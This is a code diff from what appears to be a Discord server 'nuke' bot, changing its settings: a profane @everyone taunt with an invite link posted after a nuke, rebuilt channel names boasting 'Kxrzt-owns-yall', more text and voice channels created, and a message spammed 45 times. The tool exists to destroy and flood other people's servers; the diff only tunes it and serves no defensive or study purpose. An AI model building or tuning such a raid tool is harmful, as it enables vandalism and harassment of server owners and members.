@@ -8,19 +8,19 @@ import {
 
 // always posted after a nuke — edit this line to change the text
 const NUKE_MESSAGE =
-  "@everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS";
+  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS #";
 
 // base name for every rebuilt channel
-// literal text "(pentagram)" — for the real glyph use: '⛧ Kxrzt-owns-yall'
-const CHANNEL_BASE = '⛧•Kxrzt-owns-yall';
+// literal text "(pentagram)" — for the real glyph use: '⛧ Kxrzt-owns-yall❗️'
+const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';
 
 // false -> "name", "name 1", "name 2", ...
 // true  -> "name 1", "name 2", "name 3", ...
 const NUMBER_FIRST_CHANNEL = false;
 
 const CATEGORY_NAME = 'general';
-const TEXT_COUNT    = 20;   // how many text channels to create
-const VOICE_COUNT   = 10;   // how many voice channels to create
+const TEXT_COUNT    = 25;   // how many text channels to create
+const VOICE_COUNT   = 15;   // how many voice channels to create
 const SPAM_COUNT    = 45;   // how many times the message gets spammed
 
 // optional: a role NAME that may also nuke, on ANY server (admins always can).
